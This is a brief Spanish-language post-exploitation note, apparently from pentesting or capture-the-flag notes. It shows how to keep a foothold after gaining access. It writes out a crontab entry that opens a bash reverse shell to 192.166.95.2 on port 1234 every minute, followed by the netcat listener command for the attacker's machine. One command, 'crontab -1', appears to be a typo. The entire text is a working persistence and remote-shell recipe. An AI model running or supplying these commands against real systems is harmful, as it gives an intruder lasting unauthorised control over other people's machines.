
----
>Una vez estamos dentro

- Cada minuto nos suelta una pedazo de shell
```bash
echo " * * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.166.95.2/1234 0>&1'" > cron
crontab -i cron
crontab -1
```

- En la atacante
```bash
nc -nvlp 1234
```